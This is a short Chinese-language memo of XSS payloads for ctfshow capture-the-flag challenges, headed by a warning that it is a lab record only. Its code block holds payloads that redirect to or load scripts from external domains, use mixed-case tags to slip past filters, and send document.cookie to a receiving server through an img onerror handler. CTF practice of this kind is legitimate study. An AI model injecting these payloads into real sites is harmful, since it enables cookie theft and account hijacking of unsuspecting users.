# ctfshow XSS 通关 Payload 备忘

> [!warning] 安全提示
> 本页仅作**靶场做题记录**。以下 payload 均以代码块形式展示为纯文本，**不会在本页执行**；请勿直接在生产站点或未授权目标上使用。原始载荷指向的外部域名（js.rip / xs.pe 等）不可信，仅作示例，切勿访问或加载。

XSS 平台题常用的几类注入载荷（跳转外带 / 引外部脚本 / 大小写混淆绕过 / 事件属性触发）：

```html
<!-- 跳转外带 -->
<script>document.location.href='https://js.rip/xxxx'</script>

<!-- 引入外部脚本 -->
<script src="https://js.rip/xxxx"></script>

<!-- 大小写混淆绕过标签过滤 -->
<sCRiPt sRC=//xs.pe/xxxx></sCrIpT>

<!-- 事件属性触发 + cookie 外带 -->
<img src="" onerror=location.href="https://your-server/?cookie="+document.cookie>
```

> 实战中把外部域名替换为**自己搭建的授权接收端**，用于合法靶场（如 ctfshow）的 XSS 平台题验证。
